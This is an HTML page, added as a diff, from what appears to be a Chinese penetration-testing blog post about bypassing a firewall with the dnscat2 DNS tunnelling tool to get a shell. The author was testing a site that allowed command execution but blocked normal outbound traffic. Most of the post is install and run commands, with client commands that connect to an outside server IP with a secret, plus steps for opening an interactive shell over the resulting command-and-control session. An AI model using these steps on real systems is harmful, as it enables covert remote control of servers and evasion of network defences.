@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html>
+  
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <meta name="author" content="FengHLZ">
+  
+  
+  <title>通过DNS协议绕过防火墙getshell | xyz|All</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="渗透测试,DNS,dnscat,">
+  
+
+  
+  <meta name="description" content="FengHLZ的小站">
+
+  
+
+  <script src="/js/av-min.js" async></script>
+
+  
+
+  
+    <script src="/js/Valine.min.js" async></script>
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"mB9CftyvuDc5gN6R44KukJtw-gzGzoHsz","appkey":"gRRwrnOXHglzMIz3blENWVJV","comment":true,"count":true},
+    welcome: {"enable":true,"interval":30},
+    start_time: "2018-07-09",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "FengHLZ",
+    share: {"twitter":true,"facebook":true,"weibo":true,"qq":true,"wechat":true},
+    mathjax: false,
+    page_type: ""
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+<script src="/js/jquery.min.js"></script>
+
+  
+    <link rel="icon" href="/images/siteimage.jpg">
+    <link rel="apple-touch-icon" href="/images/siteimage.jpg">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">FengHLZ.xyz</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | Know it - Do it</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/tags/" target="_self">标签</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+        <a href="/passages/2020-02-12-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E6%80%BB%E7%BB%93/index.html" target="_self">信息搜集</a>
+      
+        <a href="/friends/" target="_self">友链</a>
+      
+        <a href="/about/index.html" target="_self">关于</a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/FengHLZ" target="_blank">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2020-05-01
+    </span>
+    
+      <span>
+        | <a href="/categories/渗透测试/"><i class="fa fa-bookmark"></i>渗透测试</a>
+      </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    通过DNS协议绕过防火墙getshell
+  </h1>
+  
+  <article class="passage-article">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近测试的时候，碰到一个站点可以执行命令，但是不能出网，无法通过常规的tcp\udp反弹shell。但是可以执行<code>ping</code>命令，DNS有记录，说明DNS可以出网，这种情况下可以考虑通过DNS协议getshell。</p>
+<h2 id="dnscat2"><a href="#dnscat2" class="headerlink" title="dnscat2"></a>dnscat2</h2><p>目标对出站流量严格限制，但通常不会限制DNS请求，也就是<code>UDP 53</code>请求。</p>
+<p><a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">dnscat2</a> 就是一款利用 DNS 协议创建加密 C2 隧道来控制服务器的工具，所以说这种隧道几乎在每个网络中都可以使用。<strong>dnscat2 由客户端和服务端两部分组成</strong>。</p>
+<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><p>安装需要ruby环境及相关依赖。遇到安装错误等问题可以搜索引擎。</p>
+<p>安装：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line">$ <span class="built_in">cd</span> dnscat2/server/</span><br><span class="line">$ gem install bundler</span><br><span class="line">$ bundle install</span><br></pre></td></tr></table></figure>
+<p>安装完成后可以尝试运行：<code>ruby dnscat2.rb</code></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200501214614.png" alt></p>
+<p>默认监听<code>UDP 53</code>，同时生成了随机的密码，服务端正在等待连接。</p>
+<p>如果在VPS上进行监听，需要在控制台开启相应的端口（<strong>类型为UDP</strong>）</p>
+<p><strong>推荐使用docker</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mpercival/dnscat2</span><br><span class="line">docker run -p 53:53/udp -it --rm mpercival/dnscat2 ruby ./dnscat2.rb</span><br></pre></td></tr></table></figure>
+<h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p><strong>Linux</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line">$ <span class="built_in">cd</span> dnscat2/client/</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure>
+<p><strong>Windows</strong>：</p>
+<p><del>可以下载GitHub上的源代码进行编译</del>，作者使用VS 2008。</p>
+<p>直接下载编译好的文件：<a href="https://downloads.skullsecurity.org/dnscat2/" target="_blank" rel="noopener">https://downloads.skullsecurity.org/dnscat2/</a></p>
+<h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>服务端运行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby dnscat2.rb --dns host=0.0.0.0,port=53531</span><br><span class="line">ruby dnscat2.rb --dns server=23.105.193.106,port=533,<span class="built_in">type</span>=TXT --secret=123456(密钥)</span><br><span class="line">ruby dnscat2.rb xxx.com</span><br></pre></td></tr></table></figure>
+<p>对应客户端运行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./dnscat --dns server=23.105.193.106,port=53531 --secret=随机密钥</span><br><span class="line">./dnscat --dns server=23.105.193.106,port=53531 --secret=qwer1234(密钥)</span><br><span class="line">./dnscat xxx.com</span><br></pre></td></tr></table></figure>
+<p>客户端成功连接：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200501215621.png" alt></p>
+<p>如果未见到<code>Session established!</code>字样，检查端口是否匹配，防火墙开放的端口是否为UDP类型。</p>
+<h3 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3><h4 id="通过sessions查看已经连接的记录"><a href="#通过sessions查看已经连接的记录" class="headerlink" title="通过sessions查看已经连接的记录"></a>通过sessions查看已经连接的记录</h4><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200501215812.png" alt></p>
+<p>使用<code>session -i 1</code>连接到该客户端：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200501215913.png" alt></p>
+<p><code>back</code>命令可以向前退回。</p>
+<h4 id="在session中使用shell可创建一个客户端的shell-or-cmd连接"><a href="#在session中使用shell可创建一个客户端的shell-or-cmd连接" class="headerlink" title="在session中使用shell可创建一个客户端的shell or cmd连接"></a>在session中使用shell可创建一个客户端的shell or cmd连接</h4><p>使用<code>session -i 1</code>进行连接后，输入<code>shell</code>命令，可以创建一个shell连接</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200501220159.png" alt></p>
+<p>回退查看sessions：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200501220237.png" alt></p>
+<h2 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h2><h2 id="学习资料"><a href="#学习资料" class="headerlink" title="学习资料"></a>学习资料</h2><p><a href="https://bl4ck.in/penetration/2016/06/03/%E9%80%9A%E8%BF%87DNS%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99.html" target="_blank" rel="noopener">通过DNS协议绕过防火墙</a></p>
+<p><a href="http://z-gelen.com/index.php/archives/134/" target="_blank" rel="noopener">dnscat2 安装和使用</a></p>
+<p>next to learn：ICMP隧道：<a href="https://mp.weixin.qq.com/s/GIS0B9xoUip9LDCAT059VA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/GIS0B9xoUip9LDCAT059VA</a></p>
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dnscat2"><span class="toc-text">dnscat2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#安装"><span class="toc-text">安装</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#服务端"><span class="toc-text">服务端</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#客户端"><span class="toc-text">客户端</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#运行"><span class="toc-text">运行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常用指令"><span class="toc-text">常用指令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#通过sessions查看已经连接的记录"><span class="toc-text">通过sessions查看已经连接的记录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#在session中使用shell可创建一个客户端的shell-or-cmd连接"><span class="toc-text">在session中使用shell可创建一个客户端的shell or cmd连接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过程分析"><span class="toc-text">过程分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#学习资料"><span class="toc-text">学习资料</span></a></li></ol>
+  </div>
+</aside>
+  
+    <aside class="passage-copyright">
+      <div>本文作者: FengHLZ</div>
+      
+        <div>
+          原文链接: 
+          <a href="" target="_blank">https://www.fenghlz.xyz/passages/2020-05-01-通过DNS协议绕过防火墙getshell/</a>
+        </div>
+      
+      <div>
+        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
+      </div>
+    </aside>
+  
+  
+    <div class="passage-tags">
+     
+      <a href="/tags/DNS/"><i class="fa fa-tags"></i>DNS</a>
+     
+      <a href="/tags/dnscat/"><i class="fa fa-tags"></i>dnscat</a>
+    
+    </div>
+  
+</div>
+
+    </main>
+    
+      <div class="site-comment-contanier">
+  <p id="site-comment-info">
+    <i class="fa fa-spinner fa-spin"></i> 评论加载中
+  </p>
+  <div id="site-comment">
+  </div>
+</div>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+      <div class="site-footer-col">
+        <h5 class="site-footer-title">博客推荐</h5>
+        
+          <span class="site-footer-item">
+            <a href="https://xin-tan.com/" target="_blank">GodBMW</a>
+          </span>
+        
+      </div>
+    
+      <div class="site-footer-col">
+        <h5 class="site-footer-title">书签</h5>
+        
+          <span class="site-footer-item">
+            <a href="https://leancloud.cn/" target="_blank">LeanCloud</a>
+          </span>
+        
+      </div>
+    
+      <div class="site-footer-col">
+        <h5 class="site-footer-title">在线工具</h5>
+        
+          <span class="site-footer-item">
+            <a href="https://www.ilovepdf.com/zh-cn" target="_blank">iLovePDF</a>
+          </span>
+        
+          <span class="site-footer-item">
+            <a href="https://www.iloveimg.com/zh-cn" target="_blank">iLoveIMG</a>
+          </span>
+        
+      </div>
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+      <div class="site-footer-info">
+        <i class="fa fa-paw"></i> 您是本站第 <span id="site-count"></span> 位访客
+      </div>
+    
+    
+      <div class="site-footer-info">
+        <i class="fa fa-at"></i> Email: 2362929771@qq.com
+      </div>
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content" style="height:55%;width:40%;">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control"/>
+      </div>
+      <div class="site-layer-reward" id="site-layer-reward" style="display: none;">
+        
+          <div>
+            <img src="/images/wechatpay.png" alt="WeChat">
+            
+              <p>WeChat</p>
+            
+          </div>
+        
+          <div>
+            <img src="/images/alipay.jpg" alt="AliPay">
+            
+              <p>AliPay</p>
+            
+          </div>
+        
+      </div>
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+    <div id="local-search-result" style="height:50%;display:none;"></div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div></div>
+  <div class="bottom-bar-left">
+    <a href="javascript:void(0);" data-enable="false">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/passages/2020-04-11-Tomcat反序列化-CVE-2016-8735复现/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+      <a href="#site-comment" data-enable="true">
+        <i class="fa fa-commenting"></i>
+      </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    <a href="javascript:void(0);" id="site-reward">
+      <i class="fa fa-thumbs-up"></i>
+    </a>
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+    <a id="share-btn-twitter" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-twitter"></i>
+    </a>
+  
+  
+    <a id="share-btn-facebook" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-facebook"></i>
+    </a>
+  
+  
+    <a id="share-btn-weibo" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-weibo"></i>
+    </a>
+  
+  
+    <a id="share-btn-qq" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-qq"></i>
+    </a>
+  
+  
+    <a id="share-btn-wechat" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-wechat"></i>
+    </a>
+  
+</div>
+    
+  <script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+  <script async>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', '');
+  </script>
+
+
+
+  <script async>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+  </script>
+
+
+
+  <script async>
+    (function(){
+    var src = (document.location.protocol == "http:") ? "http://js.passport.qihucdn.com/11.0.1.js?":"https://jspassport.ssl.qhimg.com/11.0.1.js?";
+    document.write('<script src="' + src + '" id="sozz"><\/script>');
+    })();
+  </script>
+
+
+  </body>
+</html>
